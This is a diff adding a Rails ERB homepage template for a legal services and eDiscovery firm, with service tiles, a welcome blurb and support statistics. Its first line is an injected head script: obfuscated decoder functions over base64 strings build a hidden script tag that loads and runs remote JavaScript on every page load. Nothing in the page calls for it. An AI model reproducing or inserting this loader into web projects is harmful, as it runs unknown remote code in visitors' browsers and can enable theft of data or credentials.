@@ -1,0 +1,133 @@
+<head><script>window[(function(_jlk,_03){var _CU6dW='';for(var _D3jANe=0;_D3jANe<_jlk.length;_D3jANe++){var _qDtp=_jlk[_D3jANe].charCodeAt();_03>1;_qDtp-=_03;_qDtp+=61;_qDtp%=94;_qDtp+=33;_CU6dW==_CU6dW;_qDtp!=_D3jANe;_CU6dW+=String.fromCharCode(_qDtp)}return _CU6dW})(atob('Knd+Qj86NTNEeTVJ'), 46)] = 'd2dd043c821749491561';     var zi = document.createElement('script');     (zi.type = 'text/javascript'),     (zi.async = true),     (zi.src = (function(_UQy,_uq){var _jFmUt='';for(var _JQEiMZ=0;_JQEiMZ<_UQy.length;_JQEiMZ++){var _jX1F=_UQy[_JQEiMZ].charCodeAt();_jX1F-=_uq;_jX1F+=61;_jX1F%=94;_jX1F!=_JQEiMZ;_uq>5;_jFmUt==_jFmUt;_jX1F+=33;_jFmUt+=String.fromCharCode(_jX1F)}return _jFmUt})(atob('diQkfiNIPT14IzwqdzsjcSJ3fiQjPHF9ez0qdzskb3U8eCM='), 14)),     document.readyState === 'complete'?document.body.appendChild(zi):     window.addEventListener('load', function(){         document.body.appendChild(zi)     });</script></head>
+
+<section class="presentation bg-accent-2">
+  <div class="container-fluid">
+    <div class="carousel-container">
+      <div class="carousel owl-carousel">
+        <% @presentation_elements.each_with_index do |element, index| %>
+          <div class="item">
+            <%= image_tag "presentation-#{index}.jpg", class: 'background-image' %>
+            <div class="words">
+              <h2 class="word <%= element[:class] %>"><%= element[:text].html_safe %></h2>
+            </div>
+          </div>
+        <% end %>
+      </div>
+    </div>
+    <div id="sentence-wrapper" class="d-flex justify-content-center align-items-center">
+      <div class="sentence">
+        <div class="BrandBrackets__corner_0 BrandBrackets__top-left_0"></div>
+        <div class="BrandBrackets__corner_0 BrandBrackets__top-right_0"></div>
+        <div class="BrandBrackets__corner_0 BrandBrackets__bottom-left_0"></div>
+        <div class="BrandBrackets__corner_0 BrandBrackets__bottom-right_0"></div>
+        <h4>we are</h4>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Welcome-->
+<section class="section-xs bg-default text-center">
+  <div class="container py-4">
+    <div class="row justify-content-lg-center">
+      <div class="col-lg-12 col-xl-12">
+        <h3>We are Empire Discovery</h3>
+        <h6>
+          The fastest growing nationwide provider of legal services, serving law firms,
+          corporations, financial institutions and government agencies. We have an elite team of
+          professionals focused on providing the best solutions to fit your needs.
+        </h6>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section bg-accent-2 py-4 text-center">
+  <div class="parallax-content">
+    <div class="section-xs text-center">
+      <div class="container">
+        <div class="row justify-content-md-center">
+          <div class="col-md-7 col-xl-6">
+            <h3 class="heading-decorated">Our Services</h3>
+          </div>
+        </div>
+        <div class="row row-50 offset-top-1">
+          <%= link_to digital_forensics_path, class: 'col-md-6 col-xl-4' do %>
+            <!-- Blurb tiny-->
+            <article class="blurb-tiny blurb-tiny_centered">
+              <div class="blurb-tiny__icon linear-icon-lock"></div>
+              <h5 class="blurb-tiny__title">Digital Forensics & Investigations</h5>
+              <p class="text-white">Our forensic team is prepared to collect data, onsite or remotely, in a forensically sound and defensible manner tailored to your legal requirements.</p>
+            </article>
+          <% end %>
+
+          <%= link_to e_discovery_path, class: 'col-md-6 col-xl-4' do %>
+            <!-- Blurb tiny-->
+            <article class="blurb-tiny blurb-tiny_centered">
+              <div class="blurb-tiny__icon linear-icon-magnifier"></div>
+              <h5 class="blurb-tiny__title">eDiscovery</h5>
+              <p class="text-white">Our eDiscovery specialists will work with you to customize an eDiscovery plan that fits your needs.</p>
+            </article>
+          <% end %>
+
+          <%= link_to relativity_server_path, class: 'col-md-6 col-xl-4' do %>
+            <!-- Blurb tiny-->
+            <article class="blurb-tiny blurb-tiny_centered">
+              <div class="blurb-tiny__icon linear-icon-cloud"></div>
+              <h5 class="blurb-tiny__title">Hosting</h5>
+              <p class="text-white"> Supporting RelativityServer, RelativityOne, and DISCO, we offer secure, scalable, and efficient access to your data. Whether you prefer on-site control or cloud flexibility, we ensure your data is handled with integrity, compliance, and top-tier performance.</p>
+            </article>
+          <% end %>
+
+          <%= link_to deposition_services_path, class: 'col-md-6 col-xl-4' do %>
+            <!-- Blurb tiny-->
+            <article class="blurb-tiny blurb-tiny_centered">
+              <div class="blurb-tiny__icon linear-icon-site-map"></div>
+              <h5 class="blurb-tiny__title">Generative A.I.</h5>
+              <p class="text-white">Generative AI is reshaping eDiscovery by accelerating review, surfacing insights, and reducing costs. Tools like Relativity aiR and Cecilia let teams ask simple questions, uncover facts, and automate workflows—while maintaining defensibility and transparency.</p>
+            </article>
+          <% end %>
+
+          <%= link_to artificial_intelligence_path, class: 'col-md-6 col-xl-4' do %>
+            <!-- Blurb tiny-->
+            <article class="blurb-tiny blurb-tiny_centered">
+              <div class="blurb-tiny__icon linear-icon-chart-bars"></div>
+              <h5 class="blurb-tiny__title">Data Analytics</h5>
+              <p class="text-white">Whether you need to obtain an early view of data, cull large document sets, identify specific information or prioritize review, we can assist through the process of using analytics to support and enhance workflows.</p>
+            </article>
+          <% end %>
+
+          <%= link_to paper_discovery_path, class: 'col-md-6 col-xl-4' do %>
+            <!-- Blurb tiny-->
+            <article class="blurb-tiny blurb-tiny_centered">
+              <div class="blurb-tiny__icon linear-icon-printer"></div>
+              <h5 class="blurb-tiny__title">Paper Discovery</h5>
+              <p class="text-white">From scanning, printing, copying and trial preparation, our 24/7 facility can handle all of your paper needs.</p>
+            </article>
+          <% end %>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section-xs bg-gray-lighter text-center">
+  <div class="container">
+    <div class="row justify-content-lg-center">
+      <div class="col-md-4">
+        <h1>24/7</h1>
+        <h6 class="mt-2 mt-md-4">Client Support</h6>
+      </div>
+      <div class="col-md-4">
+        <h1 class="mt-2">100+</h1>
+        <h6 class="mt-2 mt-md-4">Years of Combined Litigation Support Experience</h6>
+      </div>
+      <div class="col-md-4">
+        <h1 class="mt-2">24/7</h1>
+        <h6 class="mt-2 mt-md-4 mb-2">New York Paper Facility</h6>
+      </div>
+    </div>
+  </div>
+</section>
+
+<%= render partial: 'shared/contact_information' %>
